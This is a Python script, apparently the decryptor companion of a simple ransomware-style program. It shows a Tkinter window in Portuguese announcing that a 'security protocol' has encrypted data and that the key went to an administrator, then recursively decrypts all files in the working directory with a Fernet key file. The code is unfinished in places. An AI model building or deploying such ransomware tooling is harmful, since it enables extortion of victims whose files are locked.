import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import filedialog

root = tk.Tk()

text = tk.Label(root, text=" ")
text.pack()

text = tk.Label(root, text="                                        O protocolo de segurança foi ativado                                        ")
text.pack()

text = tk.Label(root, text=" ")
text.pack()


text = tk.Label(root, text=" ")
text.pack()

text = tk.Label(root, text="                                        Um arquivo com a chave para descriptorafar foi enviada ao endereço de e-mail da administração                                        ")
text.pack()

text = tk.Label(root, text=" ")
text.pack()

text = tk.Label(root, text="                                        Selecione o arquivo com a senha e realize a descriptografia dos dados                                        ")
text.pack()

text = tk.Label(root, text=" ")
text.pack()

label = tk.Label(root, text="Senha do administrador responsavel:")
label.pack()

entry = tk.Entry(root)
entry.pack()

def get_input():
    name = entry.get()
    print("Seu nome é:", name)

button = tk.Button(root, text="Enviar", command=get_input)
button.pack()
text = tk.Label(root, text=" ")
text.pack()

def on_button_click():
    key_file = filedialog.askopenfilename(title="Selecionar arquivo de chave")
    print(key_file)
    # Aqui você pode usar a variável key_file para ler o arquivo de chave e usá-lo para descriptografar os arquivos
    # ...
    
button = tk.Button(root, text="Descriptografar", command=on_button_click)
button.pack()

# ...





text = tk.Label(root, text=" ")
text.pack()

root.mainloop()


def decrypt_directory(directory, key):
    files = []
    # Get list of files in directory
    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        if os.path.isfile(file_path):
            try:
                # Open the file as a binary
                with open(file_path, "rb") as the_file:
                    contents = the_file.read()
                # Decrypt the content
                contents_decrypted = Fernet(key).decrypt(contents)
                # Write the decrypted content as a binary
                with open(file_path, "wb") as the_file:
                    the_file.write(contents_decrypted)
            except Exception as e:
                # In case of any error, print the error message and continue with the next file
                print(f"Error decrypting {file_path}: {e}")
        elif os.path.isdir(file_path):
            # If it's a directory, recursively decrypt its files
            decrypt_directory(file_path, key)

# Get the current directory
current_directory = os.getcwd()

# Get the key from the file
with open("thekey.key", "rb") as the_key:
    key = the_key.read()

# Decrypt files in the current directory and all subdirectories
decrypt_directory(current_directory, key)
